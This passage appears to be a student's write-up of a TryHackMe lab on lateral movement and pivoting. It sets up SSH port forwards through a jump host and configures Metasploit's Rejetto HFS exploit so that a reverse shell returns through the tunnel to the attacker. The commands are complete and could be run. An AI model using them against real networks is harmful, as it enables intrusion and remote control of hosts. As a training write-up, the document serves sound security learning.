- **Rejetto `H`ttp`F`ile`S`erver** will be listening on port 80 on `THMDC`, so we need to tunnel that port back to our attacker's machine through `THMJMP2` using `remote port forwarding`.
- Since the `Attackbox` has port 80 occupied with another service, we will need to link `port 80` on **THMDC** with some port not currently in use by the `Attackbox`.
- Let's use port `8888`. When running `ssh` in **THMJMP2** to forward this port, we would have to add `-R 8888:thmdc.za.tryhackme.com:80` to our command.


- For `SRVPORT` and `LPORT`, let's choose two random ports at will.
- ## For demonstrative purposes, we'll set `SRVPORT=6666` and `LPORT=7878`, but be sure to use different ports as the lab is shared with other students, so if two of you chose the same pots, when trying to forward them, you'll get an error stating that such port is already in use on **THMJMP2**.


- To forward such ports from our attacker machine to `THMJMP2`, we will use local port forwarding by adding `-L *:6666:127.0.0.1:6666` and `-L *:7878:127.0.0.1:7878` to our SSH command.
- This will bind both ports on `THMJMP2` and tunnel any connection back to our attacker machine.

<u>Full Command</u>:

```powershell
C:\> ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```

**Note:** If you are using the AttackBox and have joined other network rooms before, be sure to select the IP address assigned to the tunnel interface facing the `lateralmovementandpivoting` network as your ATTACKER_IP, or else your reverse shells/connections won't work properly. For your convenience, the interface attached to this network is called `lateralmovement`, so you should be able to get the right IP address by running `ip add show lateralmovement`:

- Once all port forwards are in place, we can start `Metasploit` and configure the exploit so that the required ports match the ones we have forwarded through `THMJMP2`:

```bash
user@AttackBox$ msfconsole
msf6 > use rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp

msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7878 
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666

msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```


	Breakdown:
	- "LHOST" : parameter usually serves two purposes: it is used as the IP where a listener is bound on the attacker's machine to receive a reverse shell; it is also embedded on the payload so that the victim knows where to connect back when the exploit is triggered. In our specific scenario, since "THMDC"(target) won't be able to reach back to us directly, we need to force the payload to connect back to "THMJMP2"(pivoting machine), but we need the listener to bind to the attacker's machine on "127.0.0.1". To this end, Metasploit provides an optional parameter "ReverseListenerBindAddress", which can be used to specify the listener's bind address on the attacker's machine separately from the address where the payload will connect back. In our example, we want the reverse shell listener to be bound to 127.0.0.1 on the attacker's machine and the payload to connect back to "THMJMP2" (as it will be forwarded to the attacker machine through the SSH tunnel).
	- Our exploit must also run a web server to host and send the final payload back to the victim server. We use "SRVHOST" to indicate the listening address, which in this case is 127.0.0.1, so that the attacker machine binds the webserver to localhost. While this might be counterintuitive, as no external host would be able to point to the attacker's machine localhost, the SSH tunnel will take care of forwarding any connection received on THMJMP2 at SRVPORT back to the attacker's machine.
	- The "RHOSTS" is set to point to "127.0.0.1" as the SSH tunnel will forward the request to THMDC through the SSH tunnel established with THMJMP2. RPORT is set to 8888, as any connection sent to that port on the attacker machine will be forwarded to port 80 on THMDC. Okay, so it sends the packet to itself and then finds the port <RPORT-value> which then gets redirected to THMJMP2 and then finally to the THMDC(target).

##### Goal: 
- After launching the exploit, you will receive a shell back at the attacker's machine. You will find a flag on `C:\hfs\flag.txt`.

# Conclusion

In this room, we have discussed the many ways an attacker can move around a network once they have a set of valid credentials. From an attacker's perspective, having as many different techniques as possible to perform lateral movement will always be helpful as different networks will have various restrictions in place that may or may not block some of the methods.

While we have presented the most common techniques in use, remember that anything that allows you to move from one host to another is lateral movement. Depending on the specifics of each network, other paths could be viable.
